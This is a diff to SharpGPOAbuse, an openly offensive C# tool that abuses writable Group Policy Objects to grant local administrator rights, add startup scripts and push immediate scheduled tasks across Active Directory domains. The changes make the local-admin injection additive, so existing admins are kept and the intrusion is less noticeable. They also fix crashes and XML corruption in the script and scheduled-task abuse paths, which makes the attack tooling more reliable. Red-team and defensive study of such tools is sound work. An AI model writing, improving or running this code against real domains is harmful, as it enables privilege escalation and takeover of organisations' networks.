@@ -90,7 +90,7 @@ namespace SharpGPOAbuse
                 "--AddUserRights\n" +
                 "\tAdd rights to a user account\n" +
                 "--AddLocalAdmin\n" +
-                "\tAdd a new local admin. This will replace any existing local admins!\n" +
+                "\tAdd a user to the local Administrators group (additive - existing admins are preserved).\n" +
                 "--AddComputerScript\n" +
                 "\tAdd a new computer startup script\n" +
                 "--AddUserScript\n" +
@@ -611,7 +611,19 @@ Unicode=yes
 signature=""$CHICAGO$""
 Revision=1";
 
-            string[] text = { "[Group Membership]", "*S-1-5-32-544__Memberof =", "*S-1-5-32-544__Members = *" + usr.Sid.Value };
+            // Administrators = S-1-5-32-544. Use the ADDITIVE "__Memberof" form keyed on the TARGET
+            // user's SID so the account is ADDED to the local Administrators group without removing any
+            // existing members. The old "*S-1-5-32-544__Members = *SID" form is ENFORCING and would
+            // replace the entire Administrators membership, wiping every current admin (upstream issue #11).
+            const string adminsSid = "S-1-5-32-544";
+            const string sectionHeader = "[Group Membership]";
+            string memberofLine = "*" + usr.Sid.Value + "__Memberof = *" + adminsSid;
+            string membersLine = "*" + usr.Sid.Value + "__Members =";
+
+            if (Force)
+            {
+                Console.WriteLine("[*] --Force is no longer required for --AddLocalAdmin; the change is now additive and non-destructive.");
+            }
 
             String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
             String GPT_path = path + "\\GPT.ini";
@@ -633,84 +645,96 @@ Revision=1";
                 System.IO.Directory.CreateDirectory(path);
             }
             path += "GptTmpl.inf";
-            if (File.Exists(path))
+
+            // GptTmpl.inf does not exist yet: create it from scratch with our additive entry.
+            if (!File.Exists(path))
             {
-                bool exists = false;
-                Console.WriteLine("[+] File exists: " + path);
-                string[] readText = File.ReadAllLines(path);
+                Console.WriteLine("[+] Creating file " + path);
+                System.IO.File.WriteAllText(path, start + Environment.NewLine + sectionHeader + Environment.NewLine + memberofLine + Environment.NewLine + membersLine);
+                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
+                return;
+            }
 
-                foreach (string s in readText)
+            Console.WriteLine("[+] File exists: " + path);
+            // Rewrite in the file's original encoding: GPME authors GptTmpl.inf as UTF-16 LE + BOM.
+            System.Text.Encoding originalEncoding = GetFileEncoding(path);
+            List<string> lines = new List<string>(File.ReadAllLines(path));
+
+            string normalizedTarget = memberofLine.Replace(" ", "");
+            string normalizedHeader = sectionHeader.Replace(" ", "");
+            string enforcingPrefix = "*" + adminsSid + "__Members=";
+            string sidToken = "*" + usr.Sid.Value;
+
+            int sectionIndex = -1;
+            bool alreadyAdmin = false;
+            bool enforcesAdmins = false;
+
+            for (int i = 0; i < lines.Count; i++)
+            {
+                string n = lines[i].Replace(" ", "");
+
+                if (n.Equals(normalizedTarget, StringComparison.OrdinalIgnoreCase))
                 {
-                    // Check if memberships are defined via group policy
-                    if (s.Contains("[Group Membership]"))
-                    {
-                        exists = true;
-                    }
+                    alreadyAdmin = true;
                 }
 
-                // if memberships are defined and force is NOT used
-                if (exists && !Force)
+                // Legacy enforcing entry from older versions: "*S-1-5-32-544__Members = *SID,...".
+                // Exact token match so a prefix SID can't be mistaken for ours and wrongly skip the add.
+                if (n.StartsWith(enforcingPrefix, StringComparison.OrdinalIgnoreCase))
                 {
-                    Console.WriteLine("[!] Group Memberships are already defined in the GPO. Use --force to make changes. This option might break the affected systems!\n[-] Exiting...");
-                    System.Environment.Exit(0);
-                }
-
-                // if memberships are defined and force is used
-                if (exists && Force)
-                {
-                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
+                    enforcesAdmins = true;
+                    foreach (string member in n.Substring(enforcingPrefix.Length).Split(','))
                     {
-                        foreach (string l in readText)
+                        if (member.Equals(sidToken, StringComparison.OrdinalIgnoreCase))
                         {
-                            if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members="))
-                            {
-                                if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members=") && (string.Compare(l.Replace(" ", ""), "*S-1-5-32-544__Members=") > 0))
-                                {
-                                    file2.WriteLine(l + ", *" + usr.Sid.Value);
-                                }
-                                else if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members=") && (string.Compare(l.Replace(" ", ""), "*S-1-5-32-544__Members=") == 0))
-                                {
-                                    file2.WriteLine(l + " *" + usr.Sid.Value);
-                                }
-                            }
-                            else
-                            {
-                                file2.WriteLine(l);
-                            }
+                            alreadyAdmin = true;
                         }
                     }
-                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
-                    System.Environment.Exit(0);
                 }
 
-                // if memberships are not defined
-                if (!exists)
+                if (sectionIndex == -1 && n.Equals(normalizedHeader, StringComparison.OrdinalIgnoreCase))
                 {
-                    Console.WriteLine("[+] The GPO does not specify any group memberships.");
-                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
-                    {
-                        foreach (string l in readText)
-                        {
-                            file2.WriteLine(l);
-                        }
-                        foreach (string l in text)
-                        {
-                            file2.WriteLine(l);
-                        }
-                    }
-                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
+                    sectionIndex = i;
                 }
+            }
+
+            if (alreadyAdmin)
+            {
+                Console.WriteLine("[+] " + UserAccount + " is already a member of local Administrators via this GPO. No changes made.\n[+] Done!");
+                return;
+            }
+
+            if (enforcesAdmins)
+            {
+                Console.WriteLine("[!] Note: this GPO already enforces the Administrators membership via \"__Members\". The target is being ADDED via \"__Memberof\"; existing members are preserved.");
+            }
+
+            if (sectionIndex == -1)
+            {
+                Console.WriteLine("[+] The GPO does not specify any group memberships. Adding " + UserAccount + " to local Administrators...");
+                lines.Add(sectionHeader);
+                lines.Add(memberofLine);
+                lines.Add(membersLine);
             }
             else
             {
-                Console.WriteLine("[+] Creating file " + path);
-                String new_text = null;
-                foreach (String x in text)
-                {
-                    new_text += Environment.NewLine + x;
-                }
-                System.IO.File.WriteAllText(path, start + new_text);
-                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
+                // Insert after the header so existing members are left untouched.
+                Console.WriteLine("[+] Group memberships already defined. Adding " + UserAccount + " to local Administrators without removing existing members...");
+                lines.Insert(sectionIndex + 1, membersLine);
+                lines.Insert(sectionIndex + 1, memberofLine);
+            }
+
+            System.IO.File.WriteAllLines(path, lines.ToArray(), originalEncoding);
+            UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
+        }
+
+        // Returns the file's BOM-detected encoding, or UTF-8 without BOM when none (as the tool writes).
+        public static System.Text.Encoding GetFileEncoding(string filePath)
+        {
+            using (System.IO.StreamReader reader = new System.IO.StreamReader(filePath, new System.Text.UTF8Encoding(false), true))
+            {
+                reader.Peek();
+                return reader.CurrentEncoding;
             }
         }
 
@@ -796,7 +820,9 @@ Revision=1";
 
                 }
 
-                int max = first_element.Max() + 1;
+                // Default to index 0 when scripts.ini has no numbered CmdLine entries yet; List.Max()
+                // throws on an empty sequence, which crashed the tool for an existing-but-empty scripts.ini.
+                int max = first_element.Count > 0 ? first_element.Max() + 1 : 0;
                 new_list.Add(hidden_ini = max.ToString() + "CmdLine=" + ScriptName + Environment.NewLine + max.ToString() + "Parameters=");
 
                 using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(hidden_path))
@@ -837,6 +863,15 @@ Revision=1";
             string ImmediateTaskXML;
             string start = @"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">";
             string end = @"</ScheduledTasks>";
+
+            // Escape user-supplied values so that special characters (& < > " ') do not corrupt the XML (see upstream PR #9).
+            author = System.Security.SecurityElement.Escape(author);
+            task_name = System.Security.SecurityElement.Escape(task_name);
+            command = System.Security.SecurityElement.Escape(command);
+            arguments = System.Security.SecurityElement.Escape(arguments);
+            targetUsername = System.Security.SecurityElement.Escape(targetUsername);
+            targetUserSID = System.Security.SecurityElement.Escape(targetUserSID);
+            targetDnsName = System.Security.SecurityElement.Escape(targetDnsName);
             if (objectType.Equals("Computer"))
             {
                 if (filterEnabled)
@@ -897,9 +932,12 @@ Revision=1";
                     {
                         while ((line = file.ReadLine()) != null)
                         {
-                            if (line.Replace(" ", "").Contains("</ScheduledTasks>"))
+                            // Insert the new task immediately before the closing tag instead of before the whole
+                            // line. The XML is written on a single line, so prepending before the line would place
+                            // the task ahead of the "<?xml ?>" declaration and corrupt the file (upstream PR #18 / issue #15).
+                            if (line.Contains("</ScheduledTasks>"))
                             {
-                                line = ImmediateTaskXML + line;
+                                line = line.Replace("</ScheduledTasks>", ImmediateTaskXML + "</ScheduledTasks>");
                             }
                             new_list.Add(line);
                         }
